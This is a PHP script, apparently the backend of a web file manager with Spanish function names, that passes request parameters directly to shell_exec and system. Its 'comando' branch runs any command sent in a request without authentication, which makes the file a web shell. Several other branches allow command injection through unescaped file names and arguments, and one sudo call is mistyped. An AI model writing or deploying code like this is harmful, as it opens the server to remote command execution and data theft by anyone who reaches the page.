<?php
function abrirCarpeta($ruta){
    chdir($ruta);
    $nuevasEntidades=shell_exec("ls --group-directories-first");
    return $nuevasEntidades;
}
function abrirArchivo($archivo){
    $comando="cat ${archivo} 2>&1";
    $contenido=shell_exec($comando);
    return $contenido;
}
$funcion = $_REQUEST["funcion"];
$argumento = $_REQUEST["argumento"];
if ($funcion == "abrirCarpeta"){
    echo abrirCarpeta($argumento);
}else if($funcion == "abrirArchivo"){
    echo abrirArchivo($argumento);
}else if($funcion == "directorioAnterior"){
    $pwd = $_REQUEST["pwd"];
    chdir($pwd);
    chdir($argumento);
    echo shell_exec("pwd");
}else if($funcion == "cambiarPath"){
    $pwd = $_REQUEST["pwd"];
    chdir($pwd);
    chdir($argumento);
    echo shell_exec("pwd");
}else if ($funcion == "esArchivo"){
    $file = $_REQUEST["file"];
    echo("{$file}[fin]");
    echo(shell_exec("[ -f {$argumento} ] && echo si || echo no"));
}else if ($funcion == "comando"){
    echo $argumento;
	system($argumento);
}else if ($funcion == "chmod"){
    $pwd = $_REQUEST["pwd"];
    chmod($pwd, intval($argumento, 8));
}else if ($funcion == "permisos"){
    $pwd = $_REQUEST["pwd"];
    echo decoct(fileperms($pwd));
}else if ($funcion == "info"){
    $pwd = $_REQUEST["pwd"];
    chdir($pwd);
    system("ls -lh | grep archivo.php | awk '{print $3}'");
    system("ls -lh | grep {$argumento} | awk '{print $5}'");
}else if ($funcion == "user"){
    $pwd = $_REQUEST["pwd"];
    system("sudo shown {$argumento} ${pwd}");
}
?>
